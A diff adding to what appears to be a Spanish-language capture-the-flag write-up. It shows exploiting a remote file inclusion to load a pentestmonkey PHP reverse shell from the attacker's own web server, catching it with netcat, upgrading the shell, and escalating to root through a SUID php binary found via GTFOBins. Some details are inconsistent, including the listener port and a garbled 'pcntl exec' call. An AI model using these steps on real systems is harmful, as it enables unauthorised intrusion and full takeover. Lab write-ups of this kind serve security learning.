@@ -35,4 +35,61 @@ Usamos nikto para ver si hay alguna vulnerabilidad en la web.
 /index.php?page=http://blog.cirt.net/rfiinc.txt ?: Remote File Inclusion (RFI)
 ```
 
-Tenemos una posible vuln. en la web, se trata de un RFI.
+Tenemos una posible vuln. en la web, se trata de un RFI (remote-file-inclusion)
+
+Aca lo que vamos a hacer es subir una RV (revershell.php) de pentestmokey a la maquina victima creando un servidor python.
+
+```console
+python3 -m http.server
+```
+
+Seguido nos ponemos en escucha con netcat al puerto que colocamos en la RV.
+```console
+nc -nlvp 1234
+```
+
+Ahora realizamos lo siguiente: 
+
+Vamos a la URL de la pagina y colocamos nuestra ip + la revershell pentest monkey (http://$IP/revershell)(sin la extension).
+
+Bien si todo salio excelente somos el usuarios www-data, ahora realizamos el tratamiento de la tty:
+
+```console
+$ script /dev/null -c bash
+Script started, file is /dev/null
+
+www-data@host:/$ ^Z
+zsh: suspended  nc -nlvp 443
+
+~$> stty raw -echo; fg
+
+[1]  + continued  nc -nlvp 443
+                              reset
+reset: unknown terminal type unknown
+Terminal type? xterm
+
+www-data@host:/$ export TERM=xterm
+www-data@host:/$ export SHELL=bash
+```
+
+Luego vemos que permisos SUID tenemos con el siguiente formato.
+
+```console
+find / -user root -perm /4000 2>/dev/null
+```
+Y como resultado tenemos un archivo:
+
+```console
+/usr/bin/php7.0
+```
+
+En gtfobins encontramos la manera de escalar priv.
+```console
+sudo install -m =xs $(which php) .
+
+CMD="/bin/sh"
+./php -r "pcntl exec('/bin/sh', ['-p']);"
+
+```
+
+Y listo somo User root
